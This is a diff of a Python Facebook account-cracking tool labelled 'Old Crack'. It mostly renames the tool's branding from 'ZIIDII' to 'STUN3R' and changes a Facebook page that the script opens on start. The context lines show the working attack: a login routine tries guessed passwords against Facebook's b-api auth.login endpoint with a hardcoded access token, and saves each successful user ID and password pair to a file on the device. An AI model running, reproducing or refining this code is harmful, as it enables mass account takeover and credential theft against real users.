@@ -1,8 +1,8 @@
 #----------------------------[IMPORT/MODULE]-----------------------------------#
 import requests,bs4,json,os,sys,uuid,random,datetime,time,re
 import urllib3,rich,base64
-os.system('xdg-open https://www.facebook.com/profile.php?id=61551378581997')
-print('\n \033[1;92m[✓]\r\r\033[1;92m WELCOME. TO ZIIDII RUL3X T00L ....!')
+os.system('xdg-open https://www.facebook.com/THE.LEGEND.FT.ALEX.INSIDE.007')
+print('\n \033[1;92m[✓]\r\r\033[1;92m WELCOME. TO STUN3R RUL3X T00L ....!')
 from rich.markdown import Markdown as mark
 from rich.columns import Columns as col
 from rich import pretty
@@ -45,30 +45,34 @@ logo = (f"""
 \033[1;31m#
    
 
-$$$$$$$$\ $$$$$$\ $$$$$$\ $$$$$$$\  $$$$$$\ $$$$$$\ 
-\____$$  |\_$$  _|\_$$  _|$$  __$$\ \_$$  _|\_$$  _|
-    $$  /   $$ |    $$ |  $$ |  $$ |  $$ |    $$ |  
-   $$  /    $$ |    $$ |  $$ |  $$ |  $$ |    $$ |  
-  $$  /     $$ |    $$ |  $$ |  $$ |  $$ |    $$ |  
- $$  /      $$ |    $$ |  $$ |  $$ |  $$ |    $$ |  
-$$$$$$$$\ $$$$$$\ $$$$$$\ $$$$$$$  |$$$$$$\ $$$$$$\ 
-\________|\______|\______|\_______/ \______|\______|
-                                                    
-                                                    
+
+  ______  ________  __    __  __    __   ______   _______  
+ /      \|        \|  \  |  \|  \  |  \ /      \ |       \ 
+|  $$$$$$\\$$$$$$$$| $$  | $$| $$\ | $$|  $$$$$$\| $$$$$$$\
+| $$___\$$  | $$   | $$  | $$| $$$\| $$ \$$__| $$| $$__| $$
+ \$$    \   | $$   | $$  | $$| $$$$\ $$  |     $$| $$    $$
+ _\$$$$$$\  | $$   | $$  | $$| $$\$$ $$ __\$$$$$\| $$$$$$$\
+|  \__| $$  | $$   | $$__/ $$| $$ \$$$$|  \__| $$| $$  | $$
+ \$$    $$  | $$    \$$    $$| $$  \$$$ \$$    $$| $$  | $$
+  \$$$$$$    \$$     \$$$$$$  \$$   \$$  \$$$$$$  \$$   \$$
+                                                           
+                                                           
+
+							   
                                                     
 
                                         
                                           
 \033[1;31m#                             
 \033[1;31m################################################
-\033[1;31m[\033[1;32m≈\033[1;31m]\033[1;32m DEVELOPER   :  ZIIDII XWD
-\033[1;31m[\033[1;32m≈\033[1;31m]\033[1;32m FACEBOOK    :  ASIM ❤🪽
-\033[1;31m[\033[1;32m≈\033[1;31m]\033[1;32m STATUS      :  0NLY ZIIDII US3 TH9T T00L
-\033[1;31m[\033[1;32m≈\033[1;31m]\033[1;32m GITHUB      :  https://github.com/ZIIDIIBR9ND
+\033[1;31m[\033[1;32m≈\033[1;31m]\033[1;32m DEVELOPER   :  STUN3R BR9ND
+\033[1;31m[\033[1;32m≈\033[1;31m]\033[1;32m FACEBOOK    :  STUN3R
+\033[1;31m[\033[1;32m≈\033[1;31m]\033[1;32m STATUS      :  0NLY STUN3R US3 TH9T T00L
+\033[1;31m[\033[1;32m≈\033[1;31m]\033[1;32m GITHUB      :  https://github.com/TMKC
 \033[1;31m[\033[1;32m≈\033[1;31m]\033[1;32m VERSION     :  0.1
 \033[1;31m[\033[1;32m≈\033[1;31m]\033[1;32m TOOL        :  \033[1;34mOld Crack\033[1;32m
 \033[1;93m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-\033[1;31m[\033[1;32m≈\033[1;31m]\033[1;32m ZIIDII    :  \033[1;91m\033[1;41m\033[1;33m ZIIDII XWD\033[;0m\033[1;91m\033[1;92m\033[38;5;46m
+\033[1;31m[\033[1;32m≈\033[1;31m]\033[1;32m STUN3R    :  \033[1;91m\033[1;41m\033[1;33m STUN3R BR9ND\033[;0m\033[1;91m\033[1;92m\033[38;5;46m
 \033[1;93m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[1;31m""")
 #----------------------------[MAIN/DEF]-----------------------------------#
 def main():
@@ -119,13 +123,13 @@ def login(uid):
             "x-fb-http-engine": "Liger"}
             rp=Session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers).json()
             if "session_key" in rp:
-                print(f"\r\r\033[1;30m[\033[1;33mZIDI\033[1;30m]\033[1;33m {uid} {A}•{G} {pw}")
-                open("/sdcard/ZIIDII-OLD-OK","a").write(uid+"|"+pw+"\n")
+                print(f"\r\r\033[1;30m[\033[1;33mSTUN3R\033[1;30m]\033[1;33m {uid} {A}•{G} {pw}")
+                open("/sdcard/STUN3R-OLD-OK","a").write(uid+"|"+pw+"\n")
                 oks.append(uid)
                 break 
             elif "www.facebook.com" in rp["error_msg"]:
-                print(f"\r\r\033[1;30m[\033[1;33mZIIDII\033[1;30m]\033[1;33m {uid} {A}•{G} {pw}")
-                open("/sdcard/ZIIDII-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
+                print(f"\r\r\033[1;30m[\033[1;33mSTUN3R\033[1;30m]\033[1;33m {uid} {A}•{G} {pw}")
+                open("/sdcard/STUN3R-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
                 oks.append(uid)
                 break
             else:continue
